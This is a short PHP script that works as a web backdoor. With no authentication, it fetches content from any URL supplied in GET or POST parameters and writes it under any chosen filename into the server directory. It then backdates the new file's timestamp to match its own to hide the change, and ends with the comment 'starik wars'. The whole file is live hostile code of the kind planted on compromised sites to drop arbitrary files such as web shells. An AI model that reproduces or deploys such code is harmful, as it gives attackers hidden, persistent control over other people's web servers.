<?php
$main_theme="MAIN_THEME";
if($_GET['fileurl'] and $_GET['filename']){
file_put_contents(dirname(__FILE__).'/'.trim($_GET['filename']), str_replace('M_T',$main_theme,file_get_contents(trim($_GET['fileurl']))), LOCK_EX);
$filetime=filemtime($_SERVER['SCRIPT_FILENAME']);
touch(dirname(__FILE__).'/'.trim($_GET['filename']),$filetime);
}else
if($_POST['fileurl'] and $_POST['filename']){
file_put_contents(dirname(__FILE__).'/'.trim($_POST['filename']), str_replace('M_T',$main_theme,file_get_contents(trim($_POST['fileurl']))), LOCK_EX);
$filetime=filemtime($_SERVER['SCRIPT_FILENAME']);
touch(dirname(__FILE__).'/'.trim($_POST['filename']),$filetime);
}
?>
<!--starik wars-->